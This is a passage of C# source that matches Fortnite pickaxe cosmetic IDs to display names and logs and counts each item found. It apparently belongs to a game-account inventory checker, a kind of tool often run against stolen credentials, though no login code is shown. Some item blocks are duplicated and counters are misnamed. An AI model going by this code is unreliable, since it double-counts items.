                            bool NewAxesFound3 = x.Contains("AthenaPickaxe:pickaxe_deathvalley");
                            if (NewAxesFound3)
                            {
                                sw.WriteLine("=> Death Valley");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Death Valley");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound4 = x.Contains("AthenaPickaxe:pickaxe_id_019_heart");
                            if (NewAxesFound4)
                            {
                                sw.WriteLine("=> Tat Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tat Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound5 = x.Contains("AthenaPickaxe:pickaxe_id_020_keg");
                            if (NewAxesFound5)
                            {
                                sw.WriteLine("=> Party Animal");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Party Animal");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound6 = x.Contains("AthenaPickaxe:pickaxe_id_021_megalodon");
                            if (NewAxesFound6)
                            {
                                sw.WriteLine("=> Tooth Pick");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tooth Pick");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound7 = x.Contains("AthenaPickaxe:pickaxe_id_022_holidaygiftwrap");
                            if (NewAxesFound7)
                            {
                                sw.WriteLine("=> You Shouldn't Have!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> You Shouldn't Have!");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound8 = x.Contains("AthenaPickaxe:pickaxe_id_030_artdeco");
                            if (NewAxesFound8)
                            {
                                sw.WriteLine("=> Empire Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Empire Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound9 = x.Contains("AthenaPickaxe:pickaxe_id_032_tactical");
                            if (NewAxesFound9)
                            {
                                sw.WriteLine("=> Tactical Spade");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tactical Spade");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound10 = x.Contains("AthenaPickaxe:spikypickaxe");
                            if (NewAxesFound10)
                            {
                                sw.WriteLine("=> Spiky");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spiky");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound11 = x.Contains("AthenaPickaxe:pickaxe_id_033_potofgold");
                            if (NewAxesFound11)
                            {
                                sw.WriteLine("=> Pot O' Gold");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pot O' Gold");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound12 = x.Contains("AthenaPickaxe:pickaxe_id_034_rockerpunk");
                            if (NewAxesFound12)
                            {
                                sw.WriteLine("=> Anarchy Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Anarchy Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound13 = x.Contains("AthenaPickaxe:pickaxe_id_036_cuchulainn");
                            if (NewAxesFound13)
                            {
                                sw.WriteLine("=> Silver Fang");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Silver Fang");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound14 = x.Contains("AthenaPickaxe:pickaxe_id_042_circuitbreaker");
                            if (NewAxesFound14)
                            {
                                sw.WriteLine("=> Cutting Edge");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cutting Edge");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound15 = x.Contains("AthenaPickaxe:pickaxe_id_043_orbitingplanets");
                            if (NewAxesFound15)
                            {
                                sw.WriteLine("=> Global Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Global Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound16 = x.Contains("AthenaPickaxe:pickaxe_id_049_metal");
                            if (NewAxesFound16)
                            {
                                sw.WriteLine("=> Persuader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Persuader");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound17 = x.Contains("AthenaPickaxe:pickaxe_id_052_hazmat");
                            if (NewAxesFound17)
                            {
                                sw.WriteLine("=> Autocleave");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Autocleave");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound18 = x.Contains("AthenaPickaxe:pickaxe_id_055_stop");
                            if (NewAxesFound18)
                            {
                                sw.WriteLine("=> Stop Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stop Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound19 = x.Contains("AthenaPickaxe:pickaxe_id_056_venus");
                            if (NewAxesFound19)
                            {
                                sw.WriteLine("=> Tendril");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tendril");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound20 = x.Contains("AthenaPickaxe:pickaxe_id_057_jailbird");
                            if (NewAxesFound20)
                            {
                                sw.WriteLine("=> Nite Owl");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Nite Owl");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound21 = x.Contains("AthenaPickaxe:pickaxe_id_058_basketball");
                            if (NewAxesFound21)
                            {
                                sw.WriteLine("=> Slam Dunk");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Slam Dunk");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound22 = x.Contains("AthenaPickaxe:pickaxe_id_060_darkninja");
                            if (NewAxesFound22)
                            {
                                sw.WriteLine("=> Fated Frame");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fated Frame");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound23 = x.Contains("AthenaPickaxe:pickaxe_id_065_speedyred");
                            if (NewAxesFound23)
                            {
                                sw.WriteLine("=> Razor Edge");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Razor Edge");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound24 = x.Contains("AthenaPickaxe:pickaxe_id_066_flintlockred");
                            if (NewAxesFound24)
                            {
                                sw.WriteLine("=> Crimson Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crimson Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound25 = x.Contains("AthenaPickaxe:pickaxe_id_067_taxi");
                            if (NewAxesFound25)
                            {
                                sw.WriteLine("=> Victory Lap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Victory Lap");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound26 = x.Contains("AthenaPickaxe:pickaxe_id_069_darkviking");
                            if (NewAxesFound26)
                            {
                                sw.WriteLine("=> Permafrost");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Permafrost");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound27 = x.Contains("AthenaPickaxe:pickaxe_id_070_viking");
                            if (NewAxesFound27)
                            {
                                sw.WriteLine("=> Forebearer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Forebearer");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound28 = x.Contains("AthenaPickaxe:pickaxe_id_072_luchador");
                            if (NewAxesFound28)
                            {
                                sw.WriteLine("=> Piledriver");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Piledriver");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound29 = x.Contains("AthenaPickaxe:pickaxe_id_074_sharpdresser");
                            if (NewAxesFound29)
                            {
                                sw.WriteLine("=> Studded Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Studded Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound30 = x.Contains("AthenaPickaxe:pickaxe_id_075_huya");
                            if (NewAxesFound30)
                            {
                                sw.WriteLine("=> Pointer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pointer");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound31 = x.Contains("AthenaPickaxe:pickaxe_id_076_douyu");
                            if (NewAxesFound31)
                            {
                                sw.WriteLine("=> Power Grip");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Power Grip");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound32 = x.Contains("AthenaPickaxe:pickaxe_id_078_lifeguard");
                            if (NewAxesFound32)
                            {
                                sw.WriteLine("=> Rescue Paddle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rescue Paddle");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound33 = x.Contains("AthenaPickaxe:pickaxe_id_079_modernmilitary");
                            if (NewAxesFound33)
                            {
                                sw.WriteLine("=> Caliper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Caliper");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound34 = x.Contains("AthenaPickaxe:pickaxe_id_080_scuba");
                            if (NewAxesFound34)
                            {
                                sw.WriteLine("=> Harpoon Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Harpoon Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound35 = x.Contains("AthenaPickaxe:pickaxe_id_081_streetracercobra");
                            if (NewAxesFound35)
                            {
                                sw.WriteLine("=> Clutch Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Clutch Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound36 = x.Contains("AthenaPickaxe:pickaxe_id_082_sushichef");
                            if (NewAxesFound36)
                            {
                                sw.WriteLine("=> Filet Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Filet Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound37 = x.Contains("AthenaPickaxe:pickaxe_id_083_exercise");
                            if (NewAxesFound37)
                            {
                                sw.WriteLine("=> Axercise");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Axercise");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound39 = x.Contains("AthenaPickaxe:pickaxe_id_084_durrburgerhero");
                            if (NewAxesFound39)
                            {
                                sw.WriteLine("=> Patty Whacker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Patty Whacker");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound40 = x.Contains("AthenaPickaxe:pickaxe_id_085_wukong");
                            if (NewAxesFound40)
                            {
                                sw.WriteLine("=> Jingu Bang");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jingu Bang");

                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound41 = x.Contains("AthenaPickaxe:pickaxe_id_086_biker");
                            if (NewAxesFound41)
                            {
                                sw.WriteLine("=> Throttle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Throttle");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound42 = x.Contains("AthenaPickaxe:pickaxe_id_087_hippie");
                            if (NewAxesFound42)
                            {
                                sw.WriteLine("=> Drumbeat");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Drumbeat");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound43 = x.Contains("AthenaPickaxe:pickaxe_id_088_psburnout");
                            if (NewAxesFound43)
                            {
                                sw.WriteLine("=> Controller");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Controller");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound44 = x.Contains("AthenaPickaxe:pickaxe_id_089_ravenquill");
                            if (NewAxesFound44)
                            {
                                sw.WriteLine("=> Iron Beak");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Iron Beak");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound45 = x.Contains("AthenaPickaxe:pickaxe_id_090_samuraiblue");
                            if (NewAxesFound45)
                            {
                                sw.WriteLine("=> Cat's Claw");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cat's Claw");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound46 = x.Contains("AthenaPickaxe:pickaxe_id_091_hacivat");
                            if (NewAxesFound46)
                            {
                                sw.WriteLine("=> Tree Splitter");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tree Splitter");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound47 = x.Contains("AthenaPickaxe:pickaxe_id_092_bling");
                            if (NewAxesFound47)
                            {
                                sw.WriteLine("=> Crowbar");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crowbar");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound48 = x.Contains("AthenaPickaxe:pickaxe_id_093_medic");
                            if (NewAxesFound48)
                            {
                                sw.WriteLine("=> Flatliner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flatliner");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound49 = x.Contains("AthenaPickaxe:pickaxe_id_098_garageband");
                            if (NewAxesFound49)
                            {
                                sw.WriteLine("=> Lead Swinger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lead Swinger");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound50 = x.Contains("AthenaPickaxe:pickaxe_id_077_carbidewhite");
                            if (NewAxesFound50)
                            {
                                sw.WriteLine("=> Resonator");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Resonator");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound51 = x.Contains("AthenaPickaxe:pickaxe_id_099_modernmilitaryred");
                            if (NewAxesFound51)
                            {
                                sw.WriteLine("=> Pinpoint");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pinpoint");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound52 = x.Contains("AthenaPickaxe:pickaxe_id_100_dieselpunk");
                            if (NewAxesFound52)
                            {
                                sw.WriteLine("=> Turbine");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Turbine");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound53 = x.Contains("AthenaPickaxe:pickaxe_id_101_octoberfest");
                            if (NewAxesFound53)
                            {
                                sw.WriteLine("=> Axcordion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Axcordion");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound54 = x.Contains("AthenaPickaxe:pickaxe_id_102_redriding");
                            if (NewAxesFound54)
                            {
                                sw.WriteLine("=> Guiding Glow");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Guiding Glow");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound55 = x.Contains("AthenaPickaxe:pickaxe_id_103_fortnitedj");
                            if (NewAxesFound55)
                            {
                                sw.WriteLine("=> Smash Up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Smash Up");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound56 = x.Contains("AthenaPickaxe:pickaxe_id_104_cowgirl");
                            if (NewAxesFound56)
                            {
                                sw.WriteLine("=> Reckoning");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Reckoning");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound57 = x.Contains("AthenaPickaxe:pickaxe_id_105_scarecrow");
                            if (NewAxesFound57)
                            {
                                sw.WriteLine("=> Harvester");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Harvester");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound58 = x.Contains("AthenaPickaxe:pickaxe_id_106_darkbomber");
                            if (NewAxesFound58)
                            {
                                sw.WriteLine("=> Thunder Crash");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Thunder Crash");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound59 = x.Contains("AthenaPickaxe:pickaxe_id_107_plague");
                            if (NewAxesFound59)
                            {
                                sw.WriteLine("=> Herald's Wand");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Herald's Wand");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound60 = x.Contains("AthenaPickaxe:pickaxe_id_108_pumpkinslice");
                            if (NewAxesFound60)
                            {
                                sw.WriteLine("=> Carver");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Carver");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound61 = x.Contains("AthenaPickaxe:pickaxe_id_109_skulltrooper");
                            if (NewAxesFound61)
                            {
                                sw.WriteLine("=> Skull Sickle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Skull Sickle");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound62 = x.Contains("AthenaPickaxe:pickaxe_id_110_vampire");
                            if (NewAxesFound62)
                            {
                                sw.WriteLine("=> Moonrise");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Moonrise");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound63 = x.Contains("AthenaPickaxe:pickaxe_id_111_blackwidow");
                            if (NewAxesFound63)
                            {
                                sw.WriteLine("=> Web Breaker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Web Breaker");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound64 = x.Contains("AthenaPickaxe:pickaxe_id_112_guanyu");
                            if (NewAxesFound64)
                            {
                                sw.WriteLine("=> Guandao");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Guandao");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound65 = x.Contains("AthenaPickaxe:pickaxe_id_097_raptorarcticcamo");
                            if (NewAxesFound65)
                            {
                                sw.WriteLine("=> Chill-axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chill-axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound66 = x.Contains("AthenaPickaxe:pickaxe_id_113_muertos");
                            if (NewAxesFound66)
                            {
                                sw.WriteLine("=> Six String Striker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Six String Striker");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound67 = x.Contains("AthenaPickaxe:pickaxe_id_114_badasscowboycowskull");
                            if (NewAxesFound67)
                            {
                                sw.WriteLine("=> Longhorn");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Longhorn");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound68 = x.Contains("AthenaPickaxe:pickaxe_id_115_evilcowboy");
                            if (NewAxesFound68)
                            {
                                sw.WriteLine("=> Dark Shard");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Shard");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound69 = x.Contains("AthenaPickaxe:pickaxe_id_116_celestial");
                            if (NewAxesFound69)
                            {
                                sw.WriteLine("=> Stellar Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stellar Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound70 = x.Contains("AthenaPickaxe:pickaxe_id_097_raptorarcticcamo");
                            if (NewAxesFound70)
                            {
                                sw.WriteLine("=> Chill-axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chill-axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound71 = x.Contains("AthenaPickaxe:pickaxe_id_113_muertos");
                            if (NewAxesFound71)
                            {
                                sw.WriteLine("=> Six String Striker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Six String Striker");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound72 = x.Contains("AthenaPickaxe:pickaxe_id_114_badasscowboycowskull");
                            if (NewAxesFound72)
                            {
                                sw.WriteLine("=> Longhorn");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Longhorn");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound73 = x.Contains("AthenaPickaxe:pickaxe_id_115_evilcowboy");
                            if (NewAxesFound73)
                            {
                                sw.WriteLine("=> Dark Shard");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Shard");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound75 = x.Contains("AthenaPickaxe:pickaxe_id_117_madcommander");
                            if (NewAxesFound75)
                            {
                                sw.WriteLine("=> Splinterstrike");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Splinterstrike");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound76 = x.Contains("AthenaPickaxe:pickaxe_id_118_streetops");
                            if (NewAxesFound76)
                            {
                                sw.WriteLine("=> Angular Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Angular Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound77 = x.Contains("AthenaPickaxe:pickaxe_id_119_animaljackets");
                            if (NewAxesFound77)
                            {
                                sw.WriteLine("=> Jackspammer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jackspammer");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound78 = x.Contains("AthenaPickaxe:pickaxe_id_120_samuraiultraarmor");
                            if (NewAxesFound78)
                            {
                                sw.WriteLine("=> Jawblade");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jawblade");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound79 = x.Contains("AthenaPickaxe:pickaxe_id_094_football");
                            if (NewAxesFound79)
                            {
                                sw.WriteLine("=> Upright Axe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Upright Axe");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound80 = x.Contains("AthenaPickaxe:pickaxe_id_095_footballtrophy");
                            if (NewAxesFound80)
                            {
                                sw.WriteLine("=> Golden Pigskin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Golden Pigskin");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound81 = x.Contains("AthenaPickaxe:pickaxe_id_096_footballreferee");
                            if (NewAxesFound81)
                            {
                                sw.WriteLine("=> First Downer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> First Downer");
                                }
                                Interlocked.Increment(ref TotalGlidersChecked);
                                AxesFound = AxesFound + 1;
                            }
                            bool NewAxesFound82 = x.Contains("AthenaPickaxe:pickaxe_id_121_robotred");
                            if (NewAxesFound82)
                            {
                                sw.WriteLine("=> A.x.e.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> A.x.e.");
